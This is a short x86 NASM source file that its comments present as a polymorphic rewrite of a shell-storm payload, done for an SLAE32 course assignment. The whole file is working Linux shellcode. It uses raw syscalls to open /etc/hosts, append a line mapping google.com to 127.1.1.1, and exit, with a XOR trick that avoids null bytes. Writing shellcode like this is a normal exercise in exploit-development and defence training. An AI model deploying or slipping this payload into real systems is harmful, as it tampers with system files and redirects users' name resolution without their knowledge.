; Title: Polymorphized version of add hosts entry
; Filename: shellcode1.nasm
; Author:  Mark Shaneck
; Website:  http://markshaneck.com
; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-893.php
;
; A more detailed description of this code can be found at
; http://markshaneck.com/SLAE32/slae32-assignment6
;

global _start

section .text
_start:
    xor eax, eax
    add al, 0x5    
    jmp short _load_data ; load both strings in at once
_write:
    pop ebx
    lea edx, [ebx+11]
    xor byte [ebx+10],0xff ; null terminator
    mov ecx,eax
    mov cx, 0x401
    int 0x80        ;syscall to open file

    mov ebx,eax
    mov al,0x4
    xchg ecx,edx   ; put address of string into ecx
    add dl,19
    int 0x80        ;syscall to write in the file

    mov al,0x6     ; assume that the previous call succeeds and has 0x14 in the eax register
    int 0x80        ;syscall to close the file

    inc eax         ; assume call to close succeeds and eax is left with 0
    int 0x80        ;syscall to exit

_load_data:
    call _write
    data: db "/etc/hosts",0xff,"127.1.1.1 google.com"


